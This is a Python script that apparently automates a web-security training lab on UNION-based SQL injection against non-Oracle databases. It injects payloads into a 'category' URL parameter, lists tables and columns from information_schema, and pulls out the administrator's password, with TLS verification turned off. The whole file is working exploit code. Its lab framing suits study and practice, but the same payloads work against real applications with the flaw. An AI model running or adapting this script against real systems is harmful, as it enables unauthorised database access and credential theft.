import requests
import urllib3 
from bs4 import BeautifulSoup
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection attack, listing the database contents on non-Oracle databases"

def perform_request(url, sql_payload, proxies):
    path = '/filter?category=Accessories'
    r = requests.get(url.rstrip('/') + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url, proxies):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    return soup.find(text=re.compile('.*users.*'))

def sqli_users_columns(url, table, proxies):
    sql_payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{table}'--"
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    return (
        soup.find(text=re.compile('.*username.*')),
        soup.find(text=re.compile('.*password.*'))
    )

def sqli_admin_cred(url, table, user_col, pass_col, proxies):
    sql_payload = f"' UNION SELECT {user_col}, {pass_col} FROM {table}--"
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    try:
        return soup.body.find(text="administrator").parent.findNext('td').contents[0]
    except:
        return None

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to retrieve the name of users table\n2. Adjust the payload to retrieve the names of username and password columns\n3. Adjust the payload to retrieve the administrator password\n4. Fetch the login page\n5. Extract the csrf token and session cookie\n6. Login as the administrator\n7. Fetch the administrator profile\n""")

    print("[*] Looking for users table...")
    users_table = sqli_users_table(url, proxies)
    if not users_table:
        print("[-] Could not find users table.")
        return False

    print(f"[+] Found table: {users_table}")
    user_col, pass_col = sqli_users_columns(url, users_table, proxies)
    if not user_col or not pass_col:
        print("[-] Could not find username/password columns.")
        return False

    print(f"[+] Found columns: {user_col}, {pass_col}")
    admin_password = sqli_admin_cred(url, users_table, user_col, pass_col, proxies)
    if admin_password:
        print(f"[+] Administrator password: {admin_password}")
        print(f"Go to My account on website and login with creds to solve the lab :)")
        return True
    else:
        print("[-] Administrator password not found.")
        return False
